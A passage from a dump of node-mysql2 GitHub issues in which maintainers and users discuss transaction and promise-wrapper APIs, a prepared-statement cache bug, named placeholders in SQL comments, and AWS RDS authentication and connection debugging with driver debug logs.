I don't think it's an option, we have to account for mysql2 users who currently use beginTransaction and mysqljs/mysql users whu might occasionaly switch between libs. If we decide to needs to be coordinated between both and go through long deprecation cycle. Much easier for promise wrapper though&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>sushantdhiman</Owner>
      <Body>Looks good, will need some integration tests and it should be good to go</Body>
    </Comment>
    <Comment>
      <Owner>dougwilson</Owner>
      <Body>Looking at the user docs for the API I think it is a really neat use for promises.&#13;
&#13;
As for this vs beginTransaction, I guess the only comment I would have is that the new API does not support callbacks at all while the old one does. If the old is removed that would be the only consideration: should callbacks just be removed from the entire driver surface?</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@dougwilson you mean remove `.beginTransaction()` from both promise wrapper and standard api? This is harder as I think 'standard' `.beginTransaction()` is used actively</Body>
    </Comment>
    <Comment>
      <Owner>dougwilson</Owner>
      <Body>Sorry, I meant that if the idea is after landing this new API that beginTransaction would end up deprecated and removed, then there wouldn't be a transaction callback API any longer.</Body>
    </Comment>
    <Comment>
      <Owner>mdierolf</Owner>
      <Body>I'd recommend leaving beginTransaction() for compatibility with mysqljs, and adding the following behavior:&#13;
-Calling beginTransaction() will mark the Connection as having an open transaction&#13;
-Calling commit() or rollback() will remove this mark from the Connection&#13;
-When a connection is released to the Pool, if it is marked as having an open transaction, rollback() will be called&#13;
-Remove the rollback-on-failure logic from PromisePool.transaction() and rely on the pool to automatically rollback on release&#13;
&#13;
This model will allow you to have managed transactions when using the callback API, and managed transactions + automatic connection release when using the Promise API</Body>
    </Comment>
    <Comment>
      <Owner>mdierolf</Owner>
      <Body>Any thoughts on this PR? I've been using it in production for a while, and updated it yesterday to be compatible with the new class-style code that is now in promise.js, which seems to work fine&#13;
&#13;
I'd like it if we could make a decision one way or another; if it's not something that should be included in the main tree i'd rather convert it into a monkey patch in a separate repository so I can maintain it without having to merge changes into my fork&#13;
&#13;
Also, any feedback as far as automatically rolling back open transactions when a connection is returned to the pool? If some bad code throws an exception, and then returns a connection to the pool that has an already open transaction, it seems like that would be very bad situation. </Body>
    </Comment>
    <Comment>
      <Owner>henricavalcante</Owner>
      <Body>I'm really looking forward to be able to use transactions on node-mysql2, if there is anything I can help here I'll be glad to do.</Body>
    </Comment>
  </Issue_474>
  <Issue_475>
    <Repository>node-mysql2</Repository>
    <Title>A pool should be able to hand out both promise/non-promise wrapped connections</Title>
    <Owner>sidorares</Owner>
    <Body>In several of my applications built using node-mysql2, I maintain a pool of connections in one module:&#13;
&#13;
### /db.js&#13;
&#13;
```&#13;
import mysql from 'mysql2';&#13;
export const pool = mysql.createPool(mysqlURI);&#13;
```&#13;
&#13;
In another module, I then use the pool to retrieve a connection, for operating on the connection in streaming mode, so I do this:&#13;
&#13;
### /module1.js&#13;
```&#13;
let con = pool.getConnection()&#13;
con.query("SELECT ...")&#13;
.on('result', ...)&#13;
```&#13;
In another module, I wish to use the pool to retrieve a connection, for operating on the connection in promise mode, so i'd like to do this:&#13;
&#13;
### /module2.js&#13;
```&#13;
let con = pool.getConnectionPromise()&#13;
con.query("SELECT ...")&#13;
.then( .... )&#13;
```&#13;
&#13;
Unfortunately, because the pool only allows you to retrieve either a promise or non-promise wrapped connection, I need to create 2 different pools:&#13;
&#13;
### /db.js&#13;
```&#13;
import mysql from 'mysql2';&#13;
export const pool = mysql.createPool(mysqlURI);&#13;
export const poolPromise = mysql.createPoolPromise(mysqlURI);&#13;
```&#13;
&#13;
It would be helpful if the non-promise pool allowed you to call getConnectionPromise, or queryPromise. Not all code is suited for use with promises, and maintaining two pools isn't ideal.&#13;
&#13;
IMO their should only be one type of pool and you should decide when using it whether you want a promise wrapped connection/query or not&#13;
&#13;
&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>mdierolf</Owner>
      <Body>It occurred to me after posting this, that perhaps the pool should be left alone, and any connection could be altered to allow "upgrading" it to a promise. For example:&#13;
&#13;
```&#13;
// Get a normal connection&#13;
let con = pool.getConnection();&#13;
// Do some non-promisy stuff with the connection&#13;
streamAndMangleData(con);&#13;
&#13;
// Now we need a promise wrapped connection for some reason&#13;
let pcon = con.promise();&#13;
await pcon.query("SELECT stuff");&#13;
&#13;
// Now release con back to pool&#13;
con.release();&#13;
```&#13;
&#13;
The model of calling .promise() on a non-promise API is used by aws-sdk.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>this is actually easy to implement - see https://github.com/sidorares/node-mysql2/blob/18619673910c911a8977a9ac02d898a94c27d156/promise.js#L54&#13;
&#13;
once PromiseConnection is exported the code in connection.js would look like&#13;
&#13;
```js&#13;
Connection.prototype.promise = function() {&#13;
   const PromiseConnection = require('../promise').PromiseConnection;&#13;
   return new PromiseConnection(this);&#13;
}&#13;
```&#13;
&#13;
do you want to volunteer to implement this @mdierolf ? Ideally with tests covering new functionality and few new lines in documentation&#13;
&#13;
Also same can be applied to pool&#13;
&#13;
```js&#13;
const pool = mysql.createPool(opts);&#13;
// ...&#13;
const promisifiedPool = pool.promise();&#13;
// ...&#13;
await promisifiedPool.getConnection();&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>mdierolf</Owner>
      <Body>@sidorares sure i'll give it a try over here https://github.com/CloudQuote/node-mysql2</Body>
    </Comment>
  </Issue_475>
  <Issue_476>
    <Repository>node-mysql2</Repository>
    <Title>MySQL operation failed: Unknown prepared statement handler (${#}) given to mysqld_stmt_execute</Title>
    <Owner>sidorares</Owner>
    <Body>I have a service that has been running in production for a month with no issues.  Last evening, the service failed after all queries using `.execute` were throwing this error.  Restarting the service resolved the issue.&#13;
&#13;
Let me know if I can provide more information.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>interesting, never seen anything like this.&#13;
&#13;
"prepared statement handler" is just integer, it's local to connection and usually starts  with `1`. When you do `connection.execute('select 1+?', [1])` for the first time this is what happens:&#13;
&#13;
```&#13;
client: prepare "select 1 + ?"&#13;
server: statement id = 1, expect one parameter etc etc&#13;
client: execute id=1, param = 1&#13;
server: ok, 1 column, 1 row = "2" &#13;
```&#13;
&#13;
When later you do `connection.execute('select 1+?', [123])` same happens but instead of prepare id is looked in prepared statement cache&#13;
&#13;
```&#13;
client, after realising there is already ps id for 'select 1+?': execute id=1, param = 1 &#13;
server: ok, 1 column, 1 row = "124" &#13;
```&#13;
&#13;
if you think you can possibly reproduce this, can you add `console.log(this.statement.id)` somewhere here https://github.com/sidorares/node-mysql2/blob/224c74de8184f78c540f343c432c0f37986c8aea/lib/commands/execute.js#L42 ?&#13;
&#13;
This might indicate there is a bug in a way we cache statement id, but could be something else</Body>
    </Comment>
    <Comment>
      <Owner>hellopat</Owner>
      <Body>Thanks for the info @sidorares.&#13;
&#13;
I found it strange myself that this occurred, especially after the service was running fine at load for a month.&#13;
&#13;
I'll see if I can get something into place to debug if the issue occurs again.</Body>
    </Comment>
    <Comment>
      <Owner>dekyfin</Owner>
      <Body>I have been getting the same error on my app. The error occurs when script is called multiple times in a short period of time. I think module is using a cached statement even though the statement was closed. I would appreciate it if I could get a work-around. Will it be more appropriate to not close the statement?&#13;
&#13;
This is a simplified version of the code&#13;
``` javascript&#13;
// A list of rows to be inserted into table&#13;
var data = [&#13;
    {col1: "val1", col2: "val2"},&#13;
    {col1: "val3", col2: "val4"}&#13;
];&#13;
&#13;
var stmnt, conn; // Statement and connection variables to be used in this function&#13;
&#13;
// Get a connection from Pool&#13;
Pool.getConnection( function( errCon, connection ){&#13;
&#13;
    // Interupt the script if error occurs&#13;
    if( errCon ){&#13;
        finalize( errCon );&#13;
        return;&#13;
    }&#13;
    conn = connection; &#13;
&#13;
    // Prepare statement&#13;
    connection.prepare(&#13;
        "INSERT into table( col1, col2 ) VALUES ( ?, ? ) ",&#13;
        function( err, statement ){&#13;
&#13;
            // Interupt the script if error occurs&#13;
            if( err ){&#13;
                finalize( err );&#13;
                return;&#13;
            }&#13;
&#13;
            stmnt = statement;&#13;
&#13;
            // Insert data into DB table&#13;
            data.forEach( row, index ){&#13;
                statement.execute([ row.col1, row.col2 ], (errIn, result) =&gt; finalize( errIn, index ) )&#13;
            }&#13;
            &#13;
        }&#13;
    )&#13;
}),&#13;
&#13;
function finalize( err, index ){&#13;
    if( err instanceof Error){&#13;
        stmnt &amp;&amp; stmnt.close(); // Close the prepared statement if it was set&#13;
        conn &amp;&amp; conn.release(); // Release the connection if it was created&#13;
&#13;
        console.log( err );&#13;
        res.send("an error occured");&#13;
        return;&#13;
    }&#13;
&#13;
    if( data.length === index + 1 ){&#13;
&#13;
        stmnt &amp;&amp; stmnt.close(); // Close the prepared statement if it was set&#13;
        conn &amp;&amp; conn.release(); // Release the connection if it was created&#13;
&#13;
        res.send("success")&#13;
    }&#13;
}&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@dekyfin are you getting errors with your code? With manual `.prepare()` statement is not cached, it's up to you to reuse it or not</Body>
    </Comment>
    <Comment>
      <Owner>rallfo</Owner>
      <Body>&gt; @dekyfin are you getting errors with your code? With manual `.prepare()` statement is not cached, it's up to you to reuse it or not&#13;
&#13;
Actually it does appear that manual `prepare()` statements are both cached and retrieved from the `connection._statements` LRU cache. Which is the source of the bug.&#13;
&#13;
In the case of a manual `.prepare()` then `PreparedStatementInfo.close()` a ``CloseStatement`` is sent but the statement entry is not removed from the cache. Leaving an entry to the invalid prepared statement.&#13;
&#13;
Replication: `prepare()` an insert query, `execute()` and `close()` it. Attempting to `prepare()` and `execute()` the same SQL a second time triggers this issue.&#13;
&#13;
Solution:&#13;
- either stop caching manual `prepare()` statements&#13;
- or make `PreparedStatementInfo.close()` correctly delete the statement from the `connection._statements` cache&#13;
&#13;
</Body>
    </Comment>
  </Issue_476>
  <Issue_477>
    <Repository>node-mysql2</Repository>
    <Title>Config property is undefined when using promise wrapper.</Title>
    <Owner>sidorares</Owner>
    <Body>Config property is undefined when using promise wrapper.&#13;
I see there is an underlying connection attached at "connection" property, but it breaks compatibility with typings and with mysqljs/mysql</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>can you show some code to explain better problem?&#13;
Promise wrapper is not always 1:1 compatible, but when make sense it should be</Body>
    </Comment>
    <Comment>
      <Owner>Ebuall</Owner>
      <Body>```typescript&#13;
promiseConnection.connection.config // { host, user, database... }&#13;
promiseConnection.config // undefined, even though is defined in the interface&#13;
&#13;
// but the first in typescript is looks like&#13;
(promiseConnection as any).connection.config // discouraged and unsafe&#13;
```&#13;
Of course you might think of it as a typing issue, but I had to look at the source code, to understand that.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>where do you get typings from? I don't mind adding `.config` to promise wrapper as well but interesting to understand why your setup expected to see this property&#13;
</Body>
    </Comment>
  </Issue_477>
  <Issue_478>
    <Repository>node-mysql2</Repository>
    <Title>namedPlaceholders within sql comment</Title>
    <Owner>sidorares</Owner>
    <Body>As currently written, the namedPlaceholders parser detects placeholder names within sql comments. This could lead to them being processed out of order. The example query below would result in a params array from the named-placeholders package of [ &lt;active_value_here&gt;, &lt;id_value_here&gt;, &lt;active_value_here&gt; ] rather than the expected ordering. I'm guessing that having too many params would likely be ignored, but having them out of order is decidedly a bigger problem.&#13;
&#13;
Example:&#13;
&#13;
SELECT * FROM /*:active param here should be ignored*/ user WHERE user.id = :id AND active = :active</Body>
    <State>open</State>
    <Comment>
      <Owner>ajxville</Owner>
      <Body>I've written a regex parser for this in the past that ignores namedPlaceholders in both quoted string literals and sql comments. I'm enclosing it below for your reference. I'd just submit a pull request and fix it myself, but named-placeholders doesn't seem to be a shared repository. I'll include the parser code below for your reference.&#13;
&#13;
                 //if the parameters passed were named, (then we need to anonymize them)...&#13;
                if( !util.isArray( params ) ){&#13;
&#13;
                    let paramPositionInSql = {};&#13;
&#13;
                    let paramNames = Object.keys( params );&#13;
                    let numParams = paramNames.length;&#13;
                    let paramAnonymizerRegexString = '';&#13;
                    for( let paramName of paramNames ){&#13;
&#13;
                        paramAnonymizerRegexString += `(:${ paramName }\\b)|`;&#13;
                    }&#13;
                    paramAnonymizerRegexString = paramAnonymizerRegexString.substring( 0, paramAnonymizerRegexString.length - 1 );&#13;
                    let paramAnonymizerRegex = new RegExp( paramAnonymizerRegexString, 'g' );&#13;
&#13;
                    let notContainedWithinDoubleQuotesRegex = /\\"|"(?:\\"|[^"])*"|(.+)/g;&#13;
                    query = query.replace( notContainedWithinDoubleQuotesRegex, ( matchedSubstring, contentNotWithinDoubleQuotes ) =&gt; {&#13;
&#13;
                        //if the item in question wasn't part of a string literal (IE wasn't within double quotes)...&#13;
                        if( contentNotWithinDoubleQuotes ){&#13;
&#13;
                            //remove comments from the sql query...&#13;
                            matchedSubstring = matchedSubstring.replace( /\/\*.*?\*\/|--.*?\n/g, '' );&#13;
&#13;
                            //then replace all params in ":paramName" form with "?"...&#13;
                            matchedSubstring = matchedSubstring.replace( paramAnonymizerRegex, function(){&#13;
&#13;
                                let paramRegexMatchedSubstring = arguments[ 0 ];&#13;
                                let paramOffsetFromStartOfString = arguments[ arguments.length - 2 ];&#13;
&#13;
                                let matchedParam = null;&#13;
&#13;
                                for( let i = 1; i &lt; numParams + 1; i++ ){&#13;
&#13;
                                    if( arguments[ i ] !== undefined ){&#13;
&#13;
                                        matchedParam = arguments[ i ];&#13;
                                    }&#13;
                                }&#13;
&#13;
                                if( matchedParam !== null ){&#13;
&#13;
                                    let paramName = matchedParam.substring( 1, matchedParam.length );&#13;
                                    paramPositionInSql[ paramName ] = paramOffsetFromStartOfString;&#13;
&#13;
                                    return '?';&#13;
                                }&#13;
                            });&#13;
                        }&#13;
&#13;
                        return matchedSubstring;&#13;
                    });&#13;
&#13;
                    let paramsInOrder = Object.keys( paramPositionInSql ).sort( function( a, b ){ return paramPositionInSql[ a ] - paramPositionInSql[ b ] } );&#13;
&#13;
                    let paramsAsArray = [];&#13;
&#13;
                    for( let param of paramsInOrder ){&#13;
&#13;
                        paramsAsArray.push( params[ param ] );&#13;
                    }&#13;
                }&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; but named-placeholders doesn't seem to be a shared repository&#13;
&#13;
the repo is here: https://github.com/mysqljs/named-placeholders , it's a module this library depends upon</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>both mysql2 and mysqljs/mysql don't claim to do full sql parsing for parameters substitution. While we happy to accept changes that make parser better while not degrading performance or readability there will be always edge cases where placeholders affected by diffefent ways you can build strings in your query or insert comment as in your example</Body>
    </Comment>
  </Issue_478>
  <Issue_479>
    <Repository>node-mysql2</Repository>
    <Title>authSwitchHandler not being triggered</Title>
    <Owner>sidorares</Owner>
    <Body>Hi,&#13;
&#13;
I've been trying to set up IAM authentication for my AWS RDS instance and can't seem to get it working.&#13;
I believe I have everything correct on the infrastructure side but I keep getting a `Access denied` error.&#13;
In the `authSwitchHandler` function I've added a `console.log` but it never seems to get triggered.&#13;
&#13;
Is there any reason why it wouldn't happen?&#13;
&#13;
I've put some example code that I'm trying to execute below.&#13;
&#13;
Thanks,&#13;
Gary&#13;
&#13;
```&#13;
const AWS = require('aws-sdk');&#13;
const mysql = require('mysql2/promise');&#13;
&#13;
const signer = new AWS.RDS.Signer({&#13;
  region: process.env.REGION,&#13;
  hostname: process.env.DB_HOSTNAME,&#13;
  port: 3306,&#13;
  username: process.env.DB_USERNAME,&#13;
});&#13;
const token = signer.getAuthToken();&#13;
&#13;
exports.main = async (event, context, callback) =&gt; {&#13;
  const config = {&#13;
    host: process.env.DB_HOSTNAME,&#13;
    user: process.env.DB_USERNAME,&#13;
    password: token,&#13;
    database: process.env.DB_NAME,&#13;
    ssl: 'Amazon RDS',&#13;
    authSwitchHandler: (data, cb) =&gt; {&#13;
      console.log('authSwitchHandler', data);&#13;
      cb(null, Buffer.from(`${token}\0`));&#13;
    },&#13;
  };&#13;
  console.log('Config', config);&#13;
&#13;
  const connection = await mysql.createConnection(config);&#13;
  console.log('Connection', connection);&#13;
&#13;
  return callback(null, {&#13;
    statusCode: 200,&#13;
    body: true,&#13;
  });&#13;
};&#13;
```&#13;
```&#13;
{&#13;
    "errorMessage": "Access denied for user 'user'@'x.x.x.x' (using password: YES)",&#13;
    "errorType": "Error",&#13;
    "stackTrace": [&#13;
        "Object.createConnection (/var/task/node_modules/mysql2/promise.js:31:31)",&#13;
        "exports.main (/var/task/src/handler.js:26:34)"&#13;
    ]&#13;
}&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Hi @garyrutland  . Can you post debug log? ( pass `debug: true` to config)</Body>
    </Comment>
    <Comment>
      <Owner>garyrutland</Owner>
      <Body>I hope this is enough, annoyingly Cloud Watch doesn't recursively output though.&#13;
&#13;
```&#13;
2018-04-14T07:45:54.173Z dbcf48be-3fb7-11e8-bfdc-d96a4e6043b2 Add command: Connection&#13;
&#13;
2018-04-14T07:45:54.179Z dbcf48be-3fb7-11e8-bfdc-d96a4e6043b2 raw: 0a352e372e32312d6c6f6700090b0000362a1f1a4f556a7400ffff080200ffc1150000000000000000000002710c7208370f0a62087a7e006d7973716c5f6e61746976655f70617373776f726400&#13;
&#13;
2018-04-14T07:45:54.180Z dbcf48be-3fb7-11e8-bfdc-d96a4e6043b2 [object Object]&#13;
at Connection.handlePacket (/var/task/node_modules/mysql2/lib/connection.js:472:15)&#13;
at PacketParser.onPacket (/var/task/node_modules/mysql2/lib/connection.js:81:16)&#13;
at PacketParser.executeStart (/var/task/node_modules/mysql2/lib/packet_parser.js:77:14)&#13;
at Socket.&lt;anonymous&gt; (/var/task/node_modules/mysql2/lib/connection.js:89:29)&#13;
at emitOne (events.js:116:13)&#13;
at Socket.emit (events.js:211:7)&#13;
at addChunk (_stream_readable.js:263:12)&#13;
at readableAddChunk (_stream_readable.js:250:11)&#13;
at Socket.Readable.push (_stream_readable.js:208:10)&#13;
at TCP.onread (net.js:607:20)&#13;
&#13;
2018-04-14T07:45:54.180Z dbcf48be-3fb7-11e8-bfdc-d96a4e6043b2 0 undefined ==&gt; Connection#handshakeInit(0,,82)&#13;
&#13;
2018-04-14T07:45:54.213Z dbcf48be-3fb7-11e8-bfdc-d96a4e6043b2 Server hello packet: capability flags:3254779903=(long password, found rows, long flag, connect with db, no schema, compress, odbc, local files, ignore space, protocol 41, interactive, ssl, ignore sigpipe, transactions, reserved, secure connection, multi statements, multi results, ps multi results, plugin auth, connect attrs, plugin auth lenenc client data, can handle expired passwords, session track, deprecate eof, ssl verify server cert, remember options)&#13;
&#13;
2018-04-14T07:45:54.214Z dbcf48be-3fb7-11e8-bfdc-d96a4e6043b2 0 2825 &lt;== Connection#handshakeInit(1,,36)&#13;
&#13;
2018-04-14T07:45:54.214Z dbcf48be-3fb7-11e8-bfdc-d96a4e6043b2 0 2825 &lt;== 20000001cff9aa0000000000e00000000000000000000000000000000000000000000000&#13;
&#13;
2018-04-14T07:45:54.215Z dbcf48be-3fb7-11e8-bfdc-d96a4e6043b2 Upgrading connection to TLS&#13;
&#13;
2018-04-14T07:45:54.260Z dbcf48be-3fb7-11e8-bfdc-d96a4e6043b2 Sending handshake packet: flags:11205071=(long password, found rows, long flag, connect with db, odbc, local files, ignore space, ssl, ignore sigpipe, transactions, reserved, secure connection, multi results, plugin auth, plugin auth lenenc client data, session track)&#13;
&#13;
2018-04-14T07:45:54.261Z dbcf48be-3fb7-11e8-bfdc-d96a4e6043b2 0 2825 &lt;== Connection#handshakeResult(2,,101)&#13;
&#13;
2018-04-14T07:45:54.261Z dbcf48be-3fb7-11e8-bfdc-d96a4e6043b2 0 2825 &lt;== 61000002cff9aa0000000000e000000000000000000000000000000000000000000000006a6f75726e6c65745f6772617068716c001413e749d50f7866526f2eb73fe7a44afff26c3a416d61696e006d7973716c5f6e61746976655f70617373776f726400&#13;
&#13;
2018-04-14T07:45:54.270Z dbcf48be-3fb7-11e8-bfdc-d96a4e6043b2 raw: ff15044163636573732064656e69656420666f722075736572202727402731302e302e322e3230362720287573696e672070617373776f72643a204e4f29&#13;
&#13;
2018-04-14T07:45:54.271Z dbcf48be-3fb7-11e8-bfdc-d96a4e6043b2 [object Object]&#13;
at Connection.handlePacket (/var/task/node_modules/mysql2/lib/connection.js:472:15)&#13;
at PacketParser.onPacket (/var/task/node_modules/mysql2/lib/connection.js:81:16)&#13;
at PacketParser.executeStart (/var/task/node_modules/mysql2/lib/packet_parser.js:77:14)&#13;
at TLSSocket.&lt;anonymous&gt; (/var/task/node_modules/mysql2/lib/connection.js:373:31)&#13;
at emitOne (events.js:116:13)&#13;
at TLSSocket.emit (events.js:211:7)&#13;
at addChunk (_stream_readable.js:263:12)&#13;
at readableAddChunk (_stream_readable.js:250:11)&#13;
at TLSSocket.Readable.push (_stream_readable.js:208:10)&#13;
at TLSWrap.onread (net.js:607:20)&#13;
&#13;
2018-04-14T07:45:54.271Z dbcf48be-3fb7-11e8-bfdc-d96a4e6043b2 0 2825 ==&gt; Connection#handshakeResult(3,Error,66)&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>For some reason server does not send `AuthSwitchRequest` packet in response to initial hello with `mysql_native_password` data. Protocol allows to start immediately with plugin auth but this is currently not yet supported by client.&#13;
&#13;
You can test this manually by changing `mysql_native_password` to `mysql_clear_password` here https://github.com/sidorares/node-mysql2/blob/80c55ef2b60572ef7b0ac7bee2eb45db8de6a516/lib/packets/handshake_response.js#L116 and setting `this.authToken` to be `password + \0' buffer here - https://github.com/sidorares/node-mysql2/blob/80c55ef2b60572ef7b0ac7bee2eb45db8de6a516/lib/packets/handshake_response.js#L34&#13;
&#13;
Related issues - #560 #550  #438 #332&#13;
&#13;
</Body>
    </Comment>
  </Issue_479>
  <Issue_480>
    <Repository>node-mysql2</Repository>
    <Title>SET NAME uft8mb4 loop when doing querys</Title>
    <Owner>sidorares</Owner>
    <Body>I followed the first query example and it's not working and not giving any errors. Maybe it's because my database is on a different port than default.&#13;
&#13;
My code&#13;
```javascript&#13;
const mysql = require('mysql2');&#13;
&#13;
const connection = mysql.createConnection(&#13;
    {&#13;
    host: 'database host',&#13;
    port: '6033',&#13;
    user:'clippie',&#13;
    password:'clippe password',&#13;
    database: 'clippie',&#13;
    }&#13;
);&#13;
&#13;
connection.query(&#13;
    'SELECT * FROM questions',&#13;
    function(err, results){&#13;
        if(err) throw err;&#13;
        console.log('getting questions');&#13;
        console.log(results);&#13;
});&#13;
```&#13;
I tested this with mysql package and worked like it should but for what i'm maknig i need prepared statements what mysql not supports.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Can you check that you do have access to 'database host':6033 ? &#13;
&#13;
```js&#13;
net.connect(6033, 'database host').on('connect', () =&gt; console.log('connected!'))&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>also try to connect with `debug` flag on:&#13;
&#13;
```js&#13;
const mysql = require('mysql2');&#13;
&#13;
const connection = mysql.createConnection(&#13;
    {&#13;
    debug: true,&#13;
    host: 'database host',&#13;
    port: '6033',&#13;
    user:'clippie',&#13;
    password:'clippe password',&#13;
    database: 'clippie',&#13;
    }&#13;
);&#13;
&#13;
connection.query(&#13;
    'SELECT * FROM questions',&#13;
    function(err, results){&#13;
        if(err) throw err;&#13;
        console.log('getting questions');&#13;
        console.log(results);&#13;
});&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>SimonBroos</Owner>
      <Body>I just test my connection and added the `debug` flag&#13;
&#13;
```&#13;
Add command: Connection&#13;
Add command: query&#13;
connected!&#13;
 raw: 0a31302e312e32340045cc00002e2e397668282c42002ab22102000f8015000000000000000000004a2d3e31782e772f25665556006d7973716c5f6e61746976655f70617373776f726400&#13;
Trace&#13;
    at Connection.handlePacket (C:\Users\Simon\Desktop\teamsbotbuilder\node_modules\mysql2\lib\connection.js:472:15)&#13;
    at PacketParser.onPacket (C:\Users\Simon\Desktop\teamsbotbuilder\node_modules\mysql2\lib\connection.js:81:16)&#13;
    at PacketParser.executeStart (C:\Users\Simon\Desktop\teamsbotbuilder\node_modules\mysql2\lib\packet_parser.js:77:14)&#13;
    at Socket.&lt;anonymous&gt; (C:\Users\Simon\Desktop\teamsbotbuilder\node_modules\mysql2\lib\connection.js:89:29)&#13;
    at Socket.emit (events.js:160:13)&#13;
    at addChunk (_stream_readable.js:269:12)&#13;
    at readableAddChunk (_stream_readable.js:256:11)&#13;
    at Socket.Readable.push (_stream_readable.js:213:10)&#13;
    at TCP.onread (net.js:602:20)&#13;
0 undefined ==&gt; Connection#handshakeInit(0,,79)&#13;
Server hello packet: capability flags:2148512298=(found rows, connect with db, compress, protocol 41, ignore sigpipe, transactions, secure connection, multi statements, multi results, ps multi results, plugin auth, remember options)&#13;
Sending handshake packet: flags:8582095=(long password, found rows, long flag, connect with db, odbc, local files, ignore space, protocol 41, ignore sigpipe, transactions, reserved, secure connection, multi results, session track)&#13;
0 52293 &lt;== Connection#handshakeInit(1,,73)&#13;
0 52293 &lt;== 45000001cff3820000000000e00000000000000000000000000000000000000000000000636c6970706965001453480d70cbbb23287140afe079d4d4b52da1853c636c697070696500&#13;
 raw: 00000000000000&#13;
Trace&#13;
    at Connection.handlePacket (C:\Users\Simon\Desktop\teamsbotbuilder\node_modules\mysql2\lib\connection.js:472:15)&#13;
    at PacketParser.onPacket (C:\Users\Simon\Desktop\teamsbotbuilder\node_modules\mysql2\lib\connection.js:81:16)&#13;
    at PacketParser.executeStart (C:\Users\Simon\Desktop\teamsbotbuilder\node_modules\mysql2\lib\packet_parser.js:77:14)&#13;
    at Socket.&lt;anonymous&gt; (C:\Users\Simon\Desktop\teamsbotbuilder\node_modules\mysql2\lib\connection.js:89:29)&#13;
    at Socket.emit (events.js:160:13)&#13;
    at addChunk (_stream_readable.js:269:12)&#13;
    at readableAddChunk (_stream_readable.js:256:11)&#13;
    at Socket.Readable.push (_stream_readable.js:213:10)&#13;
    at TCP.onread (net.js:602:20)&#13;
0 52293 ==&gt; Connection#handshakeResult(2,maybeOK,11)&#13;
        Sending query command: SELECT * FROM questions&#13;
0 52293 &lt;== query#start(0,,28)&#13;
0 52293 &lt;== 180000000353454c454354202a2046524f4d207175657374696f6e73&#13;
```&#13;
&#13;
And these are the results. Still no errors</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>So the last line is outgoing "SELECT * FROM questions" command. Normally server respond with OK, then column definition for each column and then rows. Is `180000000353454c454354202a2046524f4d207175657374696f6e73` the last line you see and then nothing after that? You definitely can connect to db and authenticate. What is your server version?</Body>
    </Comment>
    <Comment>
      <Owner>SimonBroos</Owner>
      <Body>yes, `180000000353454c454354202a2046524f4d207175657374696f6e73` is the last line i get&#13;
node version: 6.12.3&#13;
db: 10.1.31-MariaDB</Body>
    </Comment>
    <Comment>
      <Owner>SimonBroos</Owner>
      <Body>Small update on my problem&#13;
&#13;
When run the exmaple code, the database log get spammed with "SET NAME" command or something like that if i remember right. Until we stop the node server. &#13;
&#13;
i made a local mariaDB same version as the one i connect with on the server. When i run the example code on localhost it works perfectly fine.&#13;
&#13;
i don't know if any of this info helps.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>this sounds very strange. Driver itself does not send any additional queries for you, only what you send with `query()` or `execute()`  ( there is proposed change to query server time on connection but this is not merged yet )</Body>
    </Comment>
    <Comment>
      <Owner>SimonBroos</Owner>
      <Body>The specific query that keep spamming is 'SET NAMES utf8mb4'</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>can you check process id of connection that is doing SET NAMES utf8mb4' query and compare with your connection id ( you can see it as `connection.threadId` after you connect )</Body>
    </Comment>
    <Comment>
      <Owner>SimonBroos</Owner>
      <Body>the process id of the connection that does the `SET NAMES uft8mb4` is 248575&#13;
My connection id i get with `connection.threadId` is 19438.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>this mean that some other connection is doing this.</Body>
    </Comment>
    <Comment>
      <Owner>SimonBroos</Owner>
      <Body>The SET NAME only starts when i do a query from my program. When i stop my program the SET NAME spam stops aswell. I don't understand why it does that</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Can you add console.log somewhere in the driver code to see all commands? Lib/connection.js addCommand ( or maybe change part where debug flag is set and force it to be on)</Body>
    </Comment>
    <Comment>
      <Owner>SimonBroos</Owner>
      <Body>I was not sure what i had to console.log. i logged `this._command` and added `|| true` to the debug.&#13;
The results in the console is this&#13;
&#13;
```&#13;
Add command: Connection&#13;
ClientHandshake {&#13;
  handshake: null,&#13;
  clientFlags: 8582095,&#13;
  domain: null,&#13;
  _events: { end: [Function], error: [Function] },&#13;
  _eventsCount: 2,&#13;
  _maxListeners: undefined,&#13;
  next: [Function],&#13;
  _commandName: 'Connection' }&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>SimonBroos</Owner>
      <Body>oops, closed by accident</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>if you don't see Query commands constantly in the log it means it's not this driver doing `SET NAMES` requests</Body>
    </Comment>
    <Comment>
      <Owner>SimonBroos</Owner>
      <Body>I talked with my coworker that manage all the database here. &#13;
&#13;
He said the `SET NAME uft8mb4`Should only happen once by the database when making connection with the database.&#13;
For me it keeps happening very fast in a infinite loop when doing a query.&#13;
The process ID of the `SET NAMES` process is the ID of my database process.&#13;
&#13;
If it helps as info we use a proxysql for the database but normally that shouldn't be a problem.&#13;
</Body>
    </Comment>
  </Issue_480>
  <Issue_481>
    <Repository>node-mysql2</Repository>
    <Title>namedPlaceHolders doesn't seem to work with manual prepared statement</Title>
    <Owner>sidorares</Owner>
